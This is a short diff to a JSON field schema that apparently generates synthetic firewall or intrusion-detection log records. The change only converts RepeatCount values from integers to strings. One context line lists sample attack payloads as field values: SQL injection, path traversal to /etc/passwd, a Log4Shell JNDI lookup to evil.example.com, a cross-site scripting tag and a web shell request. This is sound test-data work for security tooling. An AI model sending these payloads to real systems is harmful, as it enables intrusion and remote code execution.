@@ -17,7 +17,7 @@
     { "name": "Protocol", "type": "string", "values": ["TCP", "UDP", "ICMP"] },
     { "name": "ApplicationProtocol", "type": "string", "values": ["HTTP", "HTTPS", "DNS", "SMB", "SSH", "RDP", "FTP", "SMTP", ""] },
     { "name": "NetworkName", "type": "string", "values": ["vpc-prod", "vpc-dev", "default"] },
-    { "name": "RepeatCount", "type": "int", "values": [1, 2, 3, 5, 10, 25, 50, 100] },
+    { "name": "RepeatCount", "type": "string", "values": ["1", "2", "3", "5", "10", "25", "50", "100"] },
     { "name": "UriOrPayload", "type": "string", "values": ["/api/v1/login?user=admin' OR 1=1--", "GET /../../etc/passwd HTTP/1.1", "${jndi:ldap://evil.example.com/a}", "/api/v1/search?q=<script>alert(1)</script>", "POST /shell.php HTTP/1.1", ""] },
     { "name": "Action", "type": "string", "values": ["ALERT", "DENY", "RESET"] },
     { "name": "SourceSystem", "type": "string", "values": ["RestAPI"] }
